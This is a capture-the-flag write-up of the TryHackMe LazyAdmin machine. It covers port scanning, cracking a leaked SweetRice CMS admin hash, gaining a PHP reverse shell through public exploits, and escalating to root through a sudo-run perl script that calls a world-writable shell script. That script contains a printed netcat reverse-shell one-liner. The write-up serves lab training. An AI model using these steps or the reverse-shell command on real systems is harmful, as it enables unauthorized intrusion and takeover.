https://tryhackme.com/room/lazyadmin

*Easy linux machine to practice your skills*

----

1) Enumeration
```bash
# Nmap 7.91 scan initiated Mon Jul 26 09:12:46 2021 as: nmap -p- -A -Pn -oA resultsNmap -vv 10.10.42.242
adjust_timeouts2: packet supposedly had rtt of -2295969 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -2295969 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -2297756 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -2297756 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -2296971 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -2296971 microseconds.  Ignoring time.
Nmap scan report for 10.10.42.242
Host is up, received user-set (0.14s latency).
Scanned at 2021-07-26 09:12:46 IST for 532s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE    REASON         VERSION
22/tcp open  ssh        syn-ack ttl 60 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo0a0DBybd2oCUPGjhXN1BQrAhbKKJhN/PW2OCccDm6KB/+sH/2UWHy3kE1XDgWO2W3EEHVd6vf7SdrCt7sWhJSno/q1ICO6ZnHBCjyWcRMxojBvVtS4kOlzungcirIpPDxiDChZoy+ZdlC3hgnzS5ih/RstPbIy0uG7QI/K7wFzW7dqMlYw62CupjNHt/O16DlokjkzSdq9eyYwzef/CDRb5QnpkTX5iQcxyKiPzZVdX/W8pfP3VfLyd/cxBqvbtQcl3iT1n+QwL8+QArh01boMgWs6oIDxvPxvXoJ0Ts0pEQ2BFC9u7CgdvQz1p+VtuxdH6mu9YztRymXmXPKJfB
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC8TzxsGQ1Xtyg+XwisNmDmdsHKumQYqiUbxqVd+E0E0TdRaeIkSGov/GKoXY00EX2izJSImiJtn0j988XBOTFE=
|   256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe/TbqqjC/bQMfBM29kV2xApQbhUXLFwFJPU14Y9/Nm
80/tcp open  tcpwrapped syn-ack ttl 60
|_http-title: Apache2 Ubuntu Default Page: It works
```

----

2) Foothold / Getting a shell

Observations. Only two services. SSH and Apache webserver.

- Port 22 - OpenSSH 7.2p2
```bash
└─$ searchsploit openssh 7.2p2
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                           |  Path
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                                 | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                           | linux/remote/45210.py
OpenSSH 7.2p2 - Username Enumeration                                                                                                     | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                                     | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                                 | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                                     | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                                                                    | linux/remote/40113.txt
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Let's get back to this later

- Port 80 - Webserver - Apache 2.4.1

Result of feroxbuster scan
`feroxbuster -u http://10.10.42.242 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php --extract-links`

```bash
301        9l       28w      314c http://10.10.42.242/content                                                                                                              
301        9l       28w      321c http://10.10.42.242/content/images                                                                                                       
200       36l      151w     2198c http://10.10.42.242/content/index.php                                                                                                    
200       15l       74w     3338c http://10.10.42.242/icons/ubuntu-logo.png                                                                                                
301        9l       28w      318c http://10.10.42.242/icons/small                                                                                                          
200      375l      968w    11321c http://10.10.42.242/index.html                                                                                                           
200      166l      644w     5108c http://10.10.42.242/icons/README                                                                                                       
301        9l       28w      317c http://10.10.42.242/content/js                                                                                                          
200        3l        8w      176c http://10.10.42.242/icons/small/folder.png

Ignoring contents of /icons/small/* since those are part of standard Apache installation

301        9l       28w      318c http://10.10.42.242/content/inc
200        0l        0w        0c http://10.10.42.242/content/inc/db.php
301        9l       28w      317c http://10.10.42.242/content/as
301        9l       28w      324c http://10.10.42.242/content/inc/cache
301        9l       28w      323c http://10.10.42.242/content/inc/lang
200        7l       28w     1553c http://10.10.42.242/content/images/captcha.php
200        0l        0w        0c http://10.10.42.242/content/inc/alert.php
200        0l        0w        0c http://10.10.42.242/content/inc/function.php
301        9l       28w      325c http://10.10.42.242/content/attachment
200        0l        0w        0c http://10.10.42.242/content/inc/404.php
200        0l        0w        0c http://10.10.42.242/content/inc/rssfeed.php
301        9l       28w      321c http://10.10.42.242/content/as/lib
200        0l        0w        0c http://10.10.42.242/content/as/lib/category.php
200        0l        0w        0c http://10.10.42.242/content/as/lib/main.php
200        0l        0w        0c http://10.10.42.242/content/as/lib/media.php
301        9l       28w      320c http://10.10.42.242/content/as/js
200        0l        0w        0c http://10.10.42.242/content/as/lib/post.php
200        0l        0w        0c http://10.10.42.242/content/as/lib/comment.php
200        0l        0w        0c http://10.10.42.242/content/as/lib/information.php
200        0l        0w        0c http://10.10.42.242/content/as/lib/ad.php
200        0l        0w        0c http://10.10.42.242/content/as/lib/license.php
200        0l        0w        0c http://10.10.42.242/content/as/lib/install.php
200        0l        0w        0c http://10.10.42.242/content/as/lib/update.php
```

Webserver is a mess. Dir listing enabled. PHP files available for everyone to see(not useful as we can only see interpreted results). Also means MySQL/DB installation on remote machine.

Webpage at http://10.10.42.242/content/ says *Welcome to SweetRice - Thank your for install SweetRice as your website management system.* Looks like some sort of CMS

Link to docs for after-install config on home page => https://www.sweetrice.xyz/docs/5-things-need-to-be-done-when-SweetRice-installed/

At http://10.10.42.242/content/inc/
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/l7genlsonfwyyzqb5u1m.png)

At http://10.10.42.242/content/as/ , some kind of admin portal
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/57jm2d08j67l1a3ralrm.png)

Ok, let's look for some exploits
```bash
└─$ searchsploit sweetrice    
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                           |  Path
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion                                                                                                  | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities                                                                                               | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download                                                                                                | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                                                                                  | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                                                                                      | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                                                                             | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                                                        | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload                                                                                    | php/webapps/14184.txt
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Trying to get the version of the CMS, but unable to. Would be great if we could use an arbitrary file upload exploit to get a reverse shell.

In the previous screenshot, we saw a "mysql_backup" folder, which seems to have a backup file. Let's download it and see if we can get some user creds.

Seems like a PHP script that contains a DB SQL schema for the CMS system. There is one statement that contains values to be inserted. In that we find

`"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\"`

So the admin username is manager? And their password hash is that 32-character string? Probably. Let's use [Crackstation](https://crackstation.net/) to crack that hash

Success. its an MD5 hash for *CENSORED*. Lets try `manager:*CENSORED*` on the admin portal we found earlier.

SUCCESS!! We have logged in as admin.
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qfb98elqeak699zaelxz.png)

We also have the version as 1.5.1. Let's try to use the [Aribtrary File Upload exploit](https://www.exploit-db.com/exploits/40716)

Lets try to upload a PHP reverse shell from `/usr/share/webshells/php` after configuring IP and port.
```bash
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|  _________                      __ __________.__                  |
| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
| \_____  \ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
| /        \     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
|/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
|        \/             \/     \/            \/        \/    \/     |                                                    
|    > SweetRice 1.5.1 Unrestricted File Upload                     |
|    > Script Cod3r : Ehsan Hosseini                                |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+

Enter The Target URL(Example : localhost.com) : 10.10.42.242/content
Enter Username : manager
Enter Password : CENSORED
Enter FileName (Example:.htaccess,shell.php5,index.html) : revshell.php
[+] Sending User&Pass...
[+] Login Succssfully...
[+] File Uploaded...
[+] URL : http://10.10.42.242/content/attachment/revshell.php
```

Trying to execute reverse shell. Login successful but not working. Getting a 404 error. There is an attachment folder but nothing inside it.

Now trying [PHP CSRF/RCE Exploit](https://www.exploit-db.com/exploits/40700)

So we will upload a HTML ad containing some PHP code for reverse shell to http://10.10.42.242/content/as/?type=ad
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/aueria9bjegszz42j3dh.png)

SUCCESS! We got shell! Also found user.txt in `/home/itguy/`

```bash
ls -l
total 56
drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Desktop
drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Documents
drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Downloads
drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Music
drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Pictures
drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Public
drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Templates
drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Videos
-rw-r--r-x 1 root  root    47 Nov 29  2019 backup.pl
-rw-r--r-- 1 itguy itguy 8980 Nov 29  2019 examples.desktop
-rw-rw-r-- 1 itguy itguy   16 Nov 29  2019 mysql_login.txt
-rw-rw-r-- 1 itguy itguy   38 Nov 29  2019 user.txt

www-data@THM-Chal:/home/itguy$ cat mysql_login.txt
*CENSORED*
```

MySQL creds. Something to keep in mind for later on.

MySQL Login success. Version info 
`Server version: 5.7.28-0ubuntu0.16.04.2`

3) Privilege Escalation

Let's try running a PrivEsc script to find some vectors

Link to lse.sh => https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh

Uploaded and running `lse.sh -i -l 1` for privesc vectors

Interesting stuff from `lse.sh` results
```bash
[*] usr020 Are there other users in administrative groups?................. yes!
---
adm:x:4:syslog,itguy
sudo:x:27:itguy

[!] sud010 Can we list sudo commands without a password?................... yes!
---
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

This looks interesting. So let's explore this a bit. 

Looks like we can run `sudo /usr/bin/perl /home/itguy/backup.pl` as anyone

Contents of backup.pl, which is readable by `www-data`
```bash
www-data@THM-Chal:/home/itguy$ cat backup.pl 
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```
Wish we could edit this, but we can't. What about `/etc/copy.sh` ?

```bash
www-data@THM-Chal:/home/itguy$ ls -l /etc/copy.sh; cat /etc/copy.sh 
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

Looks like `/etc/copy.sh` is world-writable. sysadmin originally set it up to send a reverse shell to another machine. But we will reconfigure it to execute bash and get a root shell.

After modification
```bash
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
/bin/bash -i
```

Time for action!
```bash
www-data@THM-Chal:/home/itguy$ sudo -u root /usr/bin/perl /home/itguy/backup.pl
root@THM-Chal:/home/itguy# id
uid=0(root) gid=0(root) groups=0(root)
```

Woohoo! And that's that!